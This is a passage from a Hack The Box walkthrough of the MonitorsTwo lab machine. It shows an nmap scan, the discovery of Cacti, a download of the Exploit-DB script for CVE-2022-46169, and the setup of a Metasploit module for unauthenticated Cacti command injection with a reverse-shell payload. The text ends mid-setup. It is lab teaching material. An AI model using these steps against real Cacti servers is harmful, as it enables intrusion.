---
title: HTB MonitorsTwo Walkthrough
url: https://www.secjuice.com/htb-monitorstwo-walkthrough/
source: Over Security - Cybersecurity news aggregator
date: 2024-11-25
fetch_date: 2025-10-06T19:15:26.336701
---

# HTB MonitorsTwo Walkthrough

[![Secjuice](https://www.secjuice.com/content/images/2018/12/Logo-1.png)](https://www.secjuice.com)

* [Donate](https://opencollective.com/secjuice)
* [About Us](https://secjuice.com/about-us/)
* [Technical](https://secjuice.com/tag/technical/)
* [OSINT](https://secjuice.com/tag/OSINT/)
* [Unusual Journeys](https://secjuice.com/tag/unusual-journeys-into-infosec/)
* [HoF](https://secjuice.com/secjuice-hall-of-fame/)
* [Write With Us](https://secjuice.com/join-secjuice-writing-team/)
* [Hire A Writer](https://secjuice.com/hire-infosec-cybersecurity-writer/)
* [Rankings](https://secjuice.com/secjuice-writers-ranking/)

[Sign in](#/portal/signin)
[Subscribe](#/portal/signup)

[TECHNICAL](/tag/technical/)

# HTB MonitorsTwo Walkthrough

Learn how to exploit a vulnerable Catci instance in this hack the box post.

* [![Andy74](/content/images/size/w100/2020/01/avatar.png)](/author/andy74/)

#### [Andy74](/author/andy74/)

Nov 24, 2024
• 20 min read

![HTB MonitorsTwo Walkthrough](/content/images/size/w2000/2024/11/turkeys_doing_cirque_du_soleil_with_a_lock_box_trap.jpg)

Turkeys performing in a magician show. Microsoft Copilot created this image.

Not a bad BOX, the foothold towards the user flag is interesting, but privileges escalation to root is a little less convincing. Let's begin.

The **nmap** scan.

```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-14 15:26 EDT
Nmap scan report for 10.10.11.211
Host is up (0.15s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Login to Cacti
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.82 seconds
```

As usual, we start from a portal; I don't see any indications of particular *domain* names, so we proceed in the more traditional way, browsing the portal by *IP address*.

![](https://www.secjuice.com/content/images/2023/05/img-00-1.png)

Wow, really nice! :D

![](https://www.secjuice.com/content/images/2023/05/img-01-1.png)

And some more information via the **wappalyzer**.

[Cacti® - The Complete RRDTool-based Graphing Solution

![](https://www.cacti.net/favicon.ico)Cacti®

![](https://www.cacti.net/images/logo.svg)](https://www.cacti.net/?ref=secjuice.com)

From the news box, the **Cacti 1.2.24** was released on Feb 27, 2023!
Anyway, searching for some exploit about it...

[Cacti v1.2.22 - Remote Command Execution (RCE)

Cacti v1.2.22 - Remote Command Execution (RCE). CVE-2022-46169 . webapps exploit for PHP platform

![](https://www.exploit-db.com/favicon.ico)Exploit DatabaseRiadh Bouchahoua

![](https://www.exploit-db.com/images/spider-orange.png)](https://www.exploit-db.com/exploits/51166?ref=secjuice.com)

```
┌──(in7rud3r㉿kali-muletto)-[~/…/hackthebox/_10.10.11.211 - MonitorsTwo (lin)/attack/expl]
└─$ wget https://www.exploit-db.com/download/51166
--2023-05-14 15:52:02--  https://www.exploit-db.com/download/51166
Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.13
Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.13|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2864 (2.8K) [application/txt]
Saving to: ‘51166’

51166                                              100%[=============================================================================================================>]   2.80K  --.-KB/s    in 0s

2023-05-14 15:52:03 (32.5 MB/s) - ‘51166’ saved [2864/2864]

┌──(in7rud3r㉿kali-muletto)-[~/…/hackthebox/_10.10.11.211 - MonitorsTwo (lin)/attack/expl]
└─$ mv 51166 51166.py

┌──(in7rud3r㉿kali-muletto)-[~/…/hackthebox/_10.10.11.211 - MonitorsTwo (lin)/attack/expl]
└─$ ls -la
total 12
drwxr-xr-x 2 in7rud3r in7rud3r 4096 May 14 15:52 .
drwxr-xr-x 3 in7rud3r in7rud3r 4096 May 14 15:51 ..
-rw-r--r-- 1 in7rud3r in7rud3r 2864 May 14 15:52 51166.py

┌──(in7rud3r㉿kali-muletto)-[~/…/hackthebox/_10.10.11.211 - MonitorsTwo (lin)/attack/expl]
└─$ python3 51166.py
usage: 51166.py [-h] [-u URL] -p REMOTE_PORT -i REMOTE_IP
51166.py: error: the following arguments are required: -p/--remote_port, -i/--remote_ip
```

The script doesn't seem to work, failing. I tried to reproduce the injection manually, but I get an "*unauthorized*" message, even though the returned http code is ***200***.
Let's go ahead. Another link seems to suggest that there is a module on the **metasploit framework**.

[Cacti 1.2.22 unauthenticated command injection

Rapid7’s VulnDB is curated repository of vetted computer software exploits and exploitable vulnerabilities.

![](https://www.rapid7.com/includes/img/favicon.ico)Rapid7

![](https://www.rapid7.com/globalassets/rapid7-og.jpg)](https://www.rapid7.com/db/modules/exploit/linux/http/cacti_unauthenticated_cmd_injection/?ref=secjuice.com)

```
┌──(in7rud3r㉿kali-muletto)-[~/…/hackthebox/_10.10.11.211 - MonitorsTwo (lin)/attack/expl]
└─$ msfconsole

     ,           ,
    /             \
   ((__---,,,---__))
      (_) O O (_)_________
         \ _ /            |\
          o_o \   M S F   | \
               \   _____  |  *
                |||   WW|||
                |||     |||

       =[ metasploit v6.3.14-dev                          ]
+ -- --=[ 2311 exploits - 1206 auxiliary - 412 post       ]
+ -- --=[ 975 payloads - 46 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: You can upgrade a shell to a Meterpreter
session on many platforms using sessions -u
<session_id>
Metasploit Documentation: https://docs.metasploit.com/

msf6 > use exploit/linux/http/cacti_unauthenticated_cmd_injection
[*] Using configured payload linux/x86/meterpreter/reverse_tcp
msf6 exploit(linux/http/cacti_unauthenticated_cmd_injection) > options

Module options (exploit/linux/http/cacti_unauthenticated_cmd_injection):

   Name                Current Setting  Required  Description
   ----                ---------------  --------  -----------
   HOST_ID                              no        The host_id value to use. By default, the module will try to bruteforce this.
   LOCAL_DATA_ID                        no        The local_data_id value to use. By default, the module will try to bruteforce this.
   Proxies                              no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                               yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT               8080             yes       The target port (TCP)
   SSL                 false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                              no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI           /                yes       The base path to Cacti
   URIPATH                              no        The URI to use for this exploit (default is random)
   VHOST                                no        HTTP server virtual host
   X_FORWARDED_FOR_IP  127.0.0.1        yes       The IP to use in the X-Forwarded-For HTTP header. This should be resolvable to a hostname in the poller table.

   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.

Payl...